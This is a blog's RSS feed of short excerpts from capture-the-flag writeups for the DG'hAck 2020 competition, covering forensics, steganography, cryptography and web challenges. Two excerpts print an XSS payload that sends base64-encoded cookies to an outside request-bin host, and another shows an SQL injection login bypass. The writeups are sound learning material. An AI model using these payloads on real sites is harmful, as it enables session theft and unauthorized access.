<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>ctf on Nicolas Bourras</title><link>https://nicolasb.fr/tags/ctf/</link><description>Recent content in ctf on Nicolas Bourras</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 01 Dec 2020 14:37:19 +0100</lastBuildDate><atom:link href="https://nicolasb.fr/tags/ctf/index.xml" rel="self" type="application/rss+xml"/><item><title>DG'hAck: My Second CTF</title><link>https://nicolasb.fr/blog/dghack-my-second-ctf/</link><pubDate>Tue, 01 Dec 2020 14:37:19 +0100</pubDate><guid>https://nicolasb.fr/blog/dghack-my-second-ctf/</guid><description>I joined this CTF because there was a possiblity to get an internship (or a job). I think I did pretty well, ranking 1/1214 among the students, and 5 overall out of 2066 :)
This was a whole lot of fun, I got to learn a ton of things, lose some sleep, and make new friends. I can&amp;rsquo;t wait for my next CTF!
Here are the challenges that I completed, with links to my writeups:</description></item><item><title>Writeup DG'hAck: Involucrypt 2</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</link><pubDate>Tue, 01 Dec 2020 04:11:32 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/</guid><description>This is the second version of the involucrypt challenge. You can see my writeup of the first version here. It presents the encryption script and a simple bruteforce approach.
The only thing that changed for the second version is the encrypted data, which is now 1497 bytes long. This makes the previous bruteforce attempt unusable: checking a single key takes about 50ms on my machine, and there are a lot of possible keys (since it&amp;rsquo;s 10 chars instead of 3).</description></item><item><title>Writeup DG'hAck: Job Board</title><link>https://nicolasb.fr/blog/writeup-dghack-job-board/</link><pubDate>Mon, 30 Nov 2020 17:45:33 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-job-board/</guid><description>This challenge starts with a website that presents a list of jobs (once connected). Our goal is to login as an administrator. Here is the landing page:
Right of the bat, we see a login link, and a contact link. The contact page seems interesting, and after toying around with some XSS payloads, we quickly find that a bot clicks on any link that is passed as a message.</description></item><item><title>Writeup DG'hAck: Time for Something Different</title><link>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</link><pubDate>Mon, 30 Nov 2020 17:03:31 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-time-for-something-different/</guid><description>This is a steganography challenge where we&amp;rsquo;re given a PCAP file. Opening it in wireshark reveals a list of identical ICMP packets.
Nothing seems to be unique, except the time of each packet, that we can extract using tshark:
$ tshark -r data.pcap -T fields -e frame.time_epoch 1604485685.271523000 1604485685.974534000 1604485686.737381000 1604485687.390550000 1604485688.103364000 1604485689.336651000 1604485690.500205000 1604485690.982931000 1604485691.465408000 1604485692.617796000 1604485693.701056000 1604485694.814156000 1604485695.686772000 1604485696.799993000 1604485697.943153000 1604485699.106441000 1604485699.589015000 1604485700.071611000 1604485700.754520000 1604485701.266580000 1604485702.449633000 1604485702.942506000 1604485704.054744000 1604485705.</description></item><item><title>Writeup DG'hAck: StickItUp</title><link>https://nicolasb.fr/blog/writeup-dghack-stickitup/</link><pubDate>Mon, 30 Nov 2020 11:26:24 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-stickitup/</guid><description>When starting this challenge, we&amp;rsquo;re greeted by two forms, a login one and a registration one. Registering for an account allows us to login, which brings us to this dashboard:
We&amp;rsquo;re asked to find a note created by the admin user. I started by trying a few SQLi on the login page (they didn&amp;rsquo;t work), and noticed this in the source code:
&amp;lt;!-- $_COOKIES[&amp;#39;auth&amp;#39;] = &amp;#39;testuser:&amp;#39; . sha1(SECRET_KEY . &amp;#39;testuser&amp;#39;); --&amp;gt; So the auth cookie format is username:hash, where the hash is a SHA1 of a secret plus the username.</description></item><item><title>Writeup DG'hAck: Bwing</title><link>https://nicolasb.fr/blog/writeup-dghack-bwing/</link><pubDate>Mon, 30 Nov 2020 07:19:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-bwing/</guid><description>For this challenge, we&amp;rsquo;re given a dump.raw file, which we&amp;rsquo;re told is a memory dump. We have to find confidential data in it.
First, let&amp;rsquo;s see what kind of image this is:
$ volatility -f dump.raw imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : No suggestion (Instantiated with no profile) AS Layer1 : FileAddressSpace (/home/vivescere/Projects/dghack/bwing/dump.raw) PAE type : No PAE None of the default profiles seem to work, we&amp;rsquo;ll have to create our own.</description></item><item><title>Writeup DG'hAck: Sad Crypto</title><link>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</link><pubDate>Mon, 30 Nov 2020 01:33:35 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-sad-crypto/</guid><description>This challenge starts with a login page:
From the description, we gather that this is a service that generates decryption keys when given a French SSN. Our goal is to get the key for this number: 1-46-85-30-750-318-37.
admin/admin doesn&amp;rsquo;t seem to work, let&amp;rsquo;s try an SQLi! Entering &amp;quot; or 1=1 -- as the username reveals a second page:
We seem to be able to enter a patient name (that we have to auto-complete), and get a decryption key: 797b4c-c4bd852fe0e32ebda194cb2a9fe00099.</description></item><item><title>Writeup DG'hAck: Shadowmallet</title><link>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</link><pubDate>Sat, 28 Nov 2020 06:44:23 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-shadowmallet/</guid><description>This challenge starts with a file called shadowmallet. We&amp;rsquo;re asked to help an administrator whose server detected an abnormal activity.
The file command doesn&amp;rsquo;t give us anything:
$ file shadowmallet shadowmallet: data But searching for the first few bytes (53ff 00f0 53ff 00f0 53ff 00f0 53ff 00f0) of the file online quickly reveals it&amp;rsquo;s a memory dump. Let&amp;rsquo;s use volatility!
$ volatility -f shadowmallet imageinfo Volatility Foundation Volatility Framework 2.6.1 INFO : volatility.</description></item><item><title>Writeup DG'hAck: Gitbad</title><link>https://nicolasb.fr/blog/writeup-dghack-gitbad/</link><pubDate>Sat, 28 Nov 2020 05:12:47 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-gitbad/</guid><description>This challenge takes place on a Gitlab instance, where we have to find private data. You start by creating an account, which is automatically validated after a few seconds. Once logged in, you can do a few things, for example:
create a project create a group edit your profile see the help page see public repositories Nothing seems to be particularly interesting, except for this message, on the help page:</description></item><item><title>Writeup DG'hAck: Involucrypt 1</title><link>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</link><pubDate>Fri, 20 Nov 2020 00:27:19 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-involucrypt-1/</guid><description>This writeup uses a naive approach, see my writeup of involucrypt 2 for a better solution.
The challenge starts off with two files:
crypt.py involucrypt1 The first one is a script that can encode a message, the second one contains crypted data.
Here is the (slightly redacted) script:
import itertools import operator import sys BLOCK = 150 class mersenne_rng(object): ... def keystream(seeds, length, base=None): key = base if base else [] for seed in seeds: random = mersenne_rng(seed) for _ in range(BLOCK): if len(key) == length: break key.</description></item><item><title>Writeup DG'hAck: Walters Blog</title><link>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</link><pubDate>Thu, 19 Nov 2020 05:56:46 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</guid><description>The challenge starts with a minecraft blog:
None of the pages look vulnerable. The URLs themselves don&amp;rsquo;t have any parameters, it&amp;rsquo;s just some static html (eg: /contact.html). The contact form doesn&amp;rsquo;t work: when posting something we get a 404.
On that same 404 page, we can notice the apache version:
Apache Tomcat/9.0.0.M1 Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on exploit database.</description></item><item><title>Writeup DG'hAck: Server Room</title><link>https://nicolasb.fr/blog/writeup-dghack-server-room/</link><pubDate>Thu, 19 Nov 2020 05:00:05 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-server-room/</guid><description>This challenge starts with a file, found_in_server_room.img.gz. Let&amp;rsquo;s first try to find what this file is:
$ gunzip found_in_server_room.img.gz $ file found_in_server_room.img found_in_server_room.img: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x40,0,1), end-CHS (0x3ff,3,32), startsector 8192, 524288 sectors; partition 2 : ID=0x83, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 532480, 3072000 sectors So this is a disk image. Let&amp;rsquo;s try mounting it!
$ mkdir mnt $ sudo mount found_in_server_room.img mnt NTFS signature is missing.</description></item><item><title>Writeup DG'hAck: Up Credit</title><link>https://nicolasb.fr/blog/writeup-dghack-up-credit/</link><pubDate>Thu, 19 Nov 2020 04:29:21 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-up-credit/</guid><description>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:
After logging in, we are presented with an interface that has three tabs:
an activity log a money transfer form a form to contact our financial advisor Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted.</description></item><item><title>Writeup DG'hAck: Internal Support 2</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</link><pubDate>Thu, 19 Nov 2020 03:45:38 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</guid><description>This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:
Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.</description></item><item><title>Writeup DG'hAck: Internal Support 1</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</link><pubDate>Thu, 19 Nov 2020 03:19:55 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</guid><description>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
Trying a classic xss (&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :</description></item></channel></rss>